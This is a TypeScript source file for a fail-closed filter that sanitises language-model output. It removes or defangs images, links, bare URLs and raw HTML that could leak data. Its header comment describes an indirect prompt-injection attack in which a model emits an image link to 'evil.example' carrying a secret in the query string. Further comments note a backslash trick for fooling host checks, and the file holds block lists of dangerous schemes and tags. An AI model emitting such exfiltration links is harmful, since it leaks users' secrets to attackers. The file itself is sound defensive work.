import { stripInvisible } from './unicode';

/**
 * Egress filter for **model output** before you render it.
 *
 * A successful indirect injection often tries to exfiltrate data by making the
 * model emit `![x](https://evil.example/log?q=<secret>)` or an `<img>` tag —
 * the browser fetches it the moment it renders. This filter is **fail-closed**:
 *
 *  - Raw HTML outside code is escaped by default (`html: 'escape'`), so it
 *    renders as text. `html: 'filter'` keeps tags only after validating every
 *    resource-bearing attribute; anything it cannot parse is escaped.
 *  - Markdown images are parsed with CommonMark rules; an image whose target is
 *    not allow-listed — or that cannot be parsed — is neutralised.
 *  - Fenced code blocks and inline code are left untouched.
 *
 * Still render the result with a Markdown renderer that sanitises HTML
 * (e.g. markdown-it with `html: false`, or DOMPurify) — defence in depth.
 */
export interface SanitizeOutputOptions {
  /** Hosts allowed for images. Supports leading wildcard `*.example.com`. Default: none (relative URLs only). */
  allowedImageHosts?: string[];
  /** Hosts allowed for links. Default `'*'` (links need a click; images do not). */
  allowedLinkHosts?: string[] | '*';
  /** Remove invisible / tag characters. Default `true`. */
  stripInvisible?: boolean;
  /** Replacement for removed images. Default `[image removed]`. */
  imagePlaceholder?: string;
  /**
   * Raw HTML outside code:
   * - `'escape'` (default): `<` becomes `&lt;`, so tags render as text. Autolinks are kept.
   * - `'filter'`: keep tags whose URLs are allowed; drop dangerous tags/attributes; escape the rest.
   * - `'allow'`: leave HTML untouched — only if your renderer sanitises HTML itself.
   */
  html?: 'escape' | 'filter' | 'allow';
  /**
   * Bare URLs in prose (`https://…`, `www.…`). Many renderers (marked with its
   * default `gfm: true`, markdown-it with `linkify`) turn these into links with
   * no Markdown syntax at all, so they would bypass `allowedLinkHosts`.
   * - `'defang'` (default when `allowedLinkHosts` is a list): a non-allowed bare
   *   URL is rewritten so it cannot be auto-linked (`https://x` → `hxxps://x`,
   *   `www.x` → `www[.]x`) and reported in `removedUrls`.
   * - `'keep'`: leave bare URLs alone (default when `allowedLinkHosts` is `'*'`).
   */
  bareUrls?: 'defang' | 'keep';
}

export interface SanitizeOutputResult {
  text: string;
  removedUrls: string[];
  invisibleRemoved: number;
  /** Number of HTML tags escaped or dropped. */
  htmlEscaped: number;
}

export function hostAllowed(url: string, allowed: string[]): boolean {
  let host: string;
  try {
    host = new URL(url.startsWith('//') ? `https:${url}` : url).hostname.toLowerCase();
  } catch {
    return false;
  }
  return allowed.some((rule) => {
    const r = rule.toLowerCase();
    if (r.startsWith('*.')) return host === r.slice(2) || host.endsWith(r.slice(1));
    return host === r;
  });
}

/** A URL is "remote" if it has a scheme or is protocol-relative. */
const hasScheme = (u: string) => /^[a-z][a-z0-9+.-]*:/i.test(u.trim()) || u.trim().startsWith('//');
const DANGEROUS_SCHEME = /^\s*(?:javascript|vbscript|data|file):/i;

/** ASCII punctuation that CommonMark lets you backslash-escape. */
const ESCAPABLE = /\\([!"#$%&'()*+,\-./:;<=>?@[\\\]^_`{|}~])/g;
const NAMED_ENTITIES: Record<string, string> = { amp: '&', quot: '"', apos: "'", lt: '<', gt: '>' };

/**
 * The destination a CommonMark renderer will actually emit for `raw`, or
 * `null` when it cannot be decided safely. Renderers resolve backslash escapes
 * and entity references *before* the browser parses the URL, while a plain
 * `new URL(raw)` treats `\` as a path separator — so `https://ok\@evil` looks
 * like host `ok` to a naive check but renders as `https://ok@evil` (host
 * `evil`). Checking the rendered form closes that gap.
 */
function renderedDestination(raw: string): string | null {
  let unresolved = false;
  const out = raw
    .replace(ESCAPABLE, '$1')
    .replace(/&(#x[0-9a-f]{1,6}|#[0-9]{1,7}|[a-z][a-z0-9]{1,31});/gi, (m, body: string) => {
      const b = body.toLowerCase();
      if (b.startsWith('#x'))
        return String.fromCodePoint(Math.min(parseInt(b.slice(2), 16), 0x10ffff));
      if (b.startsWith('#'))
        return String.fromCodePoint(Math.min(parseInt(b.slice(1), 10), 0x10ffff));
      if (b in NAMED_ENTITIES) return NAMED_ENTITIES[b]!;
      unresolved = true; // an entity we don't decode might change the host: fail closed
      return m;
    });
  return unresolved ? null : out;
}

/**
 * Normalise a URL for an allow-list decision. Remote URLs are rejected outright
 * (`null`) if they contain a backslash in either form: renderers, autolinkers
 * and browsers disagree on what `\` means, and no legitimate URL needs one.
 */
function decisionUrl(raw: string): { url: string; remote: boolean } | null {
  const trimmed = raw.trim();
  const rendered = renderedDestination(trimmed);
  if (rendered === null) return null;
  // Renderers differ on stray angle brackets (`<<https://…>>` is not a valid
  // CommonMark destination, yet markdown-it still links it). Judge the URL
  // inside them, so a leading `<` cannot make a remote URL look relative.
  const core = rendered.replace(/^[\s<]+/, '').replace(/[\s>]+$/, '');
  const remote = hasScheme(trimmed) || hasScheme(rendered) || hasScheme(core);
  if (remote && (trimmed.includes('\\') || rendered.includes('\\'))) return null;
  return { url: core, remote };
}

/**
 * GFM "extended autolinks": renderers such as marked (default `gfm: true`)
 * turn bare `https://…` / `www.…` text into links without any Markdown syntax.
 * No word boundary before the scheme: marked links `xhttps://…` and
 * `_https://…_` too.
 */
const BARE_URL_RE =
  /(?:(?:https?|ftp):\/\/|(?<![a-z0-9-])www\.)[^\s<>\uE000\uE001]+|(?<![\w:/.])\/\/[a-z0-9][^\s<>\uE000\uE001]*/gi;

// ─── Code-span aware splitting ─────────────────────────────────────────────

interface Segment {
  code: boolean;
  text: string;
}

/** Split Markdown into code (fenced blocks, inline code) and prose segments. Linear time. */
function splitCode(md: string): Segment[] {
  const segments: Segment[] = [];
  const lines = md.split('\n');
  let prose: string[] = [];
  let fence: { char: string; len: number } | null = null;
  let code: string[] = [];
  const flushProse = () => {
    if (prose.length) segments.push(...splitInlineCode(prose.join('\n')));
    prose = [];
  };
  lines.forEach((line, i) => {
    const nl = i < lines.length - 1 ? '\n' : '';
    if (fence) {
      code.push(line + nl);
      const close = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line);
      if (close && close[1]![0] === fence.char && close[1]!.length >= fence.len) {
        segments.push({ code: true, text: code.join('') });
        code = [];
        fence = null;
      }
      return;
    }
    const open = /^ {0,3}(`{3,}|~{3,})/.exec(line);
    if (open) {
      if (prose.length) {
        prose[prose.length - 1] += '\n';
        flushProse();
      }
      fence = { char: open[1]![0]!, len: open[1]!.length };
      code = [line + nl];
      return;
    }
    prose.push(line);
    if (nl && i === lines.length - 1) prose.push('');
  });
  if (fence) segments.push({ code: true, text: code.join('') }); // unclosed fence runs to EOF
  if (prose.length) {
    const joined = prose.join('\n');
    segments.push(...splitInlineCode(joined));
  }
  return segments;
}

function splitInlineCode(text: string): Segment[] {
  const out: Segment[] = [];
  const runs = /`+/g;
  let last = 0;
  let m: RegExpExecArray | null;
  while ((m = runs.exec(text)) !== null) {
    const len = m[0].length;
    const closer = new RegExp(`(?<!\`)\`{${len}}(?!\`)`, 'g');
    closer.lastIndex = m.index + len;
    const c = closer.exec(text);
    if (!c) continue; // unmatched backticks are literal
    if (m.index > last) out.push({ code: false, text: text.slice(last, m.index) });
    out.push({ code: true, text: text.slice(m.index, c.index + len) });
    last = c.index + len;
    runs.lastIndex = last;
  }
  if (last < text.length) out.push({ code: false, text: text.slice(last) });
  return out;
}

// ─── Markdown inline parsing (CommonMark subset) ─────────────────────────────

/** Index just after the `]` matching the `[` at `open`, honouring nesting and escapes. */
function matchBracket(s: string, open: number): number {
  let depth = 0;
  for (let i = open; i < s.length && i < open + 1000; i++) {
    const ch = s[i];
    if (ch === '\\') {
      i++;
      continue;
    }
    if (ch === '[') depth++;
    else if (ch === ']' && --depth === 0) return i + 1;
    else if (ch === '\n' && s[i + 1] === '\n') return -1; // paragraph break
  }
  return -1;
}

/** Parse `(dest "title")` starting at `(`; returns the destination and end index. */
function parseInlineTarget(s: string, open: number): { url: string; end: number } | null {
  let i = open + 1;
  const skipWs = () => {
    let newlines = 0;
    while (i < s.length && /[ \t\n]/.test(s[i]!)) {
      if (s[i] === '\n' && ++newlines > 1) return false;
      i++;
    }
    return true;
  };
  if (!skipWs()) return null;
  let url = '';
  if (s[i] === '<') {
    const close = s.indexOf('>', i + 1);
    const nl = s.indexOf('\n', i + 1);
    if (close < 0 || (nl >= 0 && nl < close)) return null;
    url = s.slice(i + 1, close);
    i = close + 1;
  } else {
    let depth = 0;
    const start = i;
    for (; i < s.length; i++) {
      const ch = s[i]!;
      if (ch === '\\') {
        i++;
        continue;
      }
      if (/\s/.test(ch)) break;
      if (ch === '(') depth++;
      else if (ch === ')') {
        if (depth === 0) break;
        depth--;
      }
    }
    url = s.slice(start, i);
  }
  if (!skipWs()) return null;
  const q = s[i];
  if (q === '"' || q === "'" || q === '(') {
    const closeCh = q === '(' ? ')' : q;
    const close = s.indexOf(closeCh, i + 1);
    if (close < 0) return null;
    i = close + 1;
    if (!skipWs()) return null;
  }
  if (s[i] !== ')') return null;
  return { url, end: i + 1 };
}

const normLabel = (l: string) => l.trim().replace(/\s+/g, ' ').toLowerCase();

// ─── HTML ────────────────────────────────────────────────────────────────

const TAG_RE =
  /<(\/?)([a-zA-Z][\w:-]*)((?:\s+[^\s"'<>/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?)*)\s*(\/?)>/y;
const ATTR_RE = /([^\s"'<>/=]+)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s"'=<>`]+))?/g;
const BLOCKED_TAGS = new Set([
  'script',
  'style',
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'link',
  'meta',
  'base',
  'form',
  'svg',
  'math',
  'template',
  'noscript',
  'portal',
  'image',
]);
const URL_ATTRS = new Set([
  'src',
  'href',
  'poster',
  'background',
  'data',
  'action',
  'formaction',
  'xlink:href',
  'lowsrc',
  'dynsrc',
  'ping',
  'cite',
  'longdesc',
  'usemap',
  'codebase',
  'archive',
  'manifest',
  'icon',
]);
const SRCSET_ATTRS = new Set(['srcset', 'imagesrcset']);
/** Private-use sentinels marking spans already validated by the Markdown pass. */
const KEEP_OPEN = '\uE000';
const KEEP_CLOSE = '\uE001';
const AUTOLINK_RE = /<([a-z][a-z0-9+.-]{1,31}:[^\s<>]*)>/iy;

export function sanitizeModelOutput(
  markdown: string,
  options: SanitizeOutputOptions = {},
): SanitizeOutputResult {
  const imgHosts = options.allowedImageHosts ?? [];
  const linkHosts = options.allowedLinkHosts ?? '*';
  const placeholder = options.imagePlaceholder ?? '[image removed]';
  const htmlMode = options.html ?? 'escape';
  const removedUrls: string[] = [];
  let htmlEscaped = 0;
  let text = markdown;
  let invisibleRemoved = 0;

  if (options.stripInvisible ?? true) {
    const r = stripInvisible(text, { collectFindings: false });
    text = r.text;
    invisibleRemoved = r.removed;
  }
  text = text.replace(/[\uE000\uE001]/g, '');

  const imageOk = (raw: string) => {
    const d = decisionUrl(raw);
    if (!d || DANGEROUS_SCHEME.test(d.url) || DANGEROUS_SCHEME.test(raw)) return false;
    return !d.remote || hostAllowed(d.url, imgHosts);
  };
  const linkOk = (raw: string) => {
    const d = decisionUrl(raw);
    if (!d || DANGEROUS_SCHEME.test(d.url) || DANGEROUS_SCHEME.test(raw)) return false;
    if (linkHosts === '*' || !d.remote) return true;
    return /^mailto:/i.test(d.url) || hostAllowed(d.url, linkHosts);
  };

  const segments = splitCode(text);
  const imageLabels = new Set<string>();

  // Pass 1: inline images & links (prose only).
  for (const seg of segments) {
    if (seg.code) continue;
    seg.text = rewriteInline(seg.text);
  }

  // Pass 2: reference definitions.
  for (const seg of segments) {
    if (seg.code) continue;
    seg.text = seg.text.replace(
      /^( {0,3}\[([^\]\n]{1,999})\]:[ \t]*)(<([^>\n]*)>|(\S+))([^\n]*)$/gm,
      (
        _line,
        head: string,
        label: string,
        dest: string,
        angled: string | undefined,
        bare: string | undefined,
        rest: string,
      ) => {
        const url = angled ?? bare ?? '';
        const usedByImage = imageLabels.has(normLabel(label));
        if (usedByImage ? !imageOk(url) : !linkOk(url)) {
          removedUrls.push(url);
          return '';
        }
        // Only the validated destination is protected. The title and anything
        // after it still go through the HTML and bare-URL passes.
        return head + KEEP_OPEN + dest + KEEP_CLOSE + rest;
      },
    );
  }

  // Pass 3: raw HTML.
  if (htmlMode !== 'allow') {
    for (const seg of segments) {
      if (seg.code) continue;
      seg.text = rewriteHtml(seg.text);
    }
  }

  // Pass 4: bare URLs a GFM / linkify renderer would auto-link.
  const bareMode = options.bareUrls ?? (linkHosts === '*' ? 'keep' : 'defang');
  if (bareMode === 'defang') {
    for (const seg of segments) {
      if (seg.code) continue;
      seg.text = defangBareUrls(seg.text);
    }
  }

  const joined = segments
    .map((s) => s.text)
    .join('')
    .replace(/[\uE000\uE001]/g, '');
  return { text: joined, removedUrls, invisibleRemoved, htmlEscaped };

  function defangBareUrls(s: string): string {
    // Skip spans the Markdown pass already validated (link/image destinations).
    return s
      .split(/(\uE000[^\uE001]*\uE001)/)
      .map((part) =>
        part.startsWith(KEEP_OPEN)
          ? part
          : part.replace(BARE_URL_RE, (url) => {
              const candidate = /^www\./i.test(url) ? `https://${url}` : url;
              if (linkOk(candidate)) return url;
              removedUrls.push(url);
              // https://x → hxxps://x, ftp://x → fxp://x, www.x → www[.]x, //x → [//]x
              return url
                .replace(/^(h)tt(ps?:\/\/)/i, '$1xx$2')
                .replace(/^(f)t(p:\/\/)/i, '$1x$2')
                .replace(/^(www)\./i, '$1[.]')
                .replace(/^\/\//, '[//]'); // //x → [//]x
            }),
      )
      .join('');
  }

  function rewriteInline(s: string): string {
    let out = '';
    let i = 0;
    while (i < s.length) {
      const bang = s[i] === '!' && s[i + 1] === '[';
      const open = bang ? i + 1 : s[i] === '[' ? i : -1;
      if (open < 0) {
        out += s[i++];
        continue;
      }
      const afterLabel = matchBracket(s, open);
      if (afterLabel < 0) {
        // Unparseable: an image start is neutralised (fail closed), a "[" is literal.
        out += bang ? '\\![' : '[';
        i = open + 1;
        continue;
      }
      const label = s.slice(open + 1, afterLabel - 1);
      if (s[afterLabel] === '(') {
        const target = parseInlineTarget(s, afterLabel);
        if (target) {
          const ok = bang ? imageOk(target.url) : linkOk(target.url);
          if (ok) {
            out +=
              (bang ? '!' : '') +
              '[' +
              (bang ? label : rewriteInline(label)) +
              ']' +
              KEEP_OPEN +
              s.slice(afterLabel, target.end) +
              KEEP_CLOSE;
          } else {
            removedUrls.push(target.url);
            out += bang ? placeholder : rewriteInline(label);
          }
          i = target.end;
          continue;
        }
        if (bang) {
          out += '\\![';
          i = open + 1;
          continue;
        }
      }
      // Reference forms: ![alt][ref], ![ref][], ![ref]
      if (bang) {
        let ref = label;
        let end = afterLabel;
        if (s[afterLabel] === '[') {
          const close = s.indexOf(']', afterLabel + 1);
          if (close > 0 && !s.slice(afterLabel + 1, close).includes('\n')) {
            const explicit = s.slice(afterLabel + 1, close);
            if (explicit.trim()) ref = explicit;
            end = close + 1;
          }
        }
        imageLabels.add(normLabel(ref));
        out += s.slice(i, end);
        i = end;
        continue;
      }
      out += '[';
      i = open + 1;
    }
    return out;
  }

  function rewriteHtml(s: string): string {
    let out = '';
    let i = 0;
    while (i < s.length) {
      const lt = s.indexOf('<', i);
      const keep = s.indexOf(KEEP_OPEN, i);
      if (keep >= 0 && (lt < 0 || keep < lt)) {
        const close = s.indexOf(KEEP_CLOSE, keep);
        out += s.slice(i, close + 1);
        i = close + 1;
        continue;
      }
      if (lt < 0) {
        out += s.slice(i);
        break;
      }
      out += s.slice(i, lt);
      AUTOLINK_RE.lastIndex = lt;
      const auto = AUTOLINK_RE.exec(s);
      if (auto) {
        if (linkOk(auto[1]!)) out += auto[0];
        else {
          removedUrls.push(auto[1]!);
          out += auto[1]!.replace(/:/, '&#58;');
        }
        i = lt + auto[0].length;
        continue;
      }
      if (htmlMode === 'filter') {
        TAG_RE.lastIndex = lt;
        const tag = TAG_RE.exec(s);
        if (tag && tagAllowed(tag[2]!.toLowerCase(), tag[1] === '/', tag[3] ?? '')) {
          out += tag[0];
          i = lt + tag[0].length;
          continue;
        }
        if (tag) {
          // Known-bad tag: drop it entirely.
          htmlEscaped++;
          i = lt + tag[0].length;
          continue;
        }
      }
      // Escape mode, or anything we could not parse: render "<" as text.
      if (/[a-zA-Z/!?]/.test(s[lt + 1] ?? '')) htmlEscaped++;
      out += '&lt;';
      i = lt + 1;
    }
    return out;
  }

  function tagAllowed(name: string, closing: boolean, attrs: string): boolean {
    if (BLOCKED_TAGS.has(name)) return false;
    if (closing) return true;
    ATTR_RE.lastIndex = 0;
    let m: RegExpExecArray | null;
    while ((m = ATTR_RE.exec(attrs)) !== null) {
      const attr = m[1]!.toLowerCase();
      const value = (m[2] ?? '').replace(/^["']|["']$/g, '');
      if (attr.startsWith('on') || attr === 'style' || attr === 'formaction') {
        if (attr === 'style' && !/url\s*\(|expression\s*\(|@import|image-set\s*\(/i.test(value))
          continue;
        return reject(value || attr);
      }
      if (URL_ATTRS.has(attr)) {
        const ok = attr === 'href' && name === 'a' ? linkOk(value) : imageOk(value);
        if (!ok) return reject(value);
      } else if (SRCSET_ATTRS.has(attr)) {
        for (const candidate of value.split(',')) {
          const url = candidate.trim().split(/\s+/)[0] ?? '';
          if (url && !imageOk(url)) return reject(url);
        }
      }
    }
    return true;
  }

  function reject(url: string): false {
    removedUrls.push(url);
    return false;
  }
}
